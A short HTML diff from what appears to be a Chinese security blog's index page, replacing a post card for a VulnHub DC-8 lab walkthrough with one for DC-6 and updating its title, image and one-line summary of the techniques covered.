+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-6 【DC系列】">
                         
-                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-6 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-6，包含了wordpress后台插件命令注入拿shell、nmap高版本提权获取root等知识。
                         
                     </div>
                     <div class="publish-info">
